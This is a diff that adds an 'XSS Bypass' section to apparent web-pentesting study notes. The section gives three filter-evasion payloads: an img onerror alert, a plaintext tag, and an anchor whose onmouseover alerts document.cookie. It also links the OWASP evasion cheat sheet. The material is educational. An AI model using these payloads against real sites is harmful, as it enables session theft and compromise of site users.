@@ -27,7 +27,19 @@ When it comes to manual XSS discovery, the difficulty of finding the XSS vulnera
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/a82237cb-c6d8-4e2b-bc1d-ab4256d4a205" width="450">
 <img src="https://github.com/alejandro-pentest/Hacking-Web/assets/161533623/aa0a4bc8-54bc-485e-a4f5-08fafd5d21b5" width="450">
 
-
+### XSS Bypass
+If we try the previous XSS injection it may fail even if the target is vulnerable, the reason is that maybe the injection is a bit sanitized, in that case we can try
+to input other tags like:
+```javascript
+<img src="" onerror=alert(window.origin)>
+```
+```javascript
+<plaintext>alert(window.origin)</plaintext>
+```
+```javascript
+\<a onmouseover="alert(document.cookie)"\>xxs link\</a\> 
+```
+**XSS BYPASSES:** [owasp - XSS_Filter_Evasion_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)
 
 
 
